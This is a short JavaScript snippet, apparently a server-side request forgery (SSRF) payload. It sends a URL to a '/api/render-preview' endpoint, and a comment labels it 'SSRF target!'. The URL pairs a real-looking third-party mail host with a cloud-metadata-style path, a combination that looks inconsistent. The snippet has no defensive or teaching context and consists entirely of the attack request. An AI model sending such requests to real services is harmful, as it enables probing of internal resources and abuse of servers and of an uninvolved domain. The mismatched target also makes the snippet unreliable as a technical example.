fetch("/api/render-preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ url: "http://mail.pagseguro.com.br/latest/meta-data/" }) // SSRF target!
});
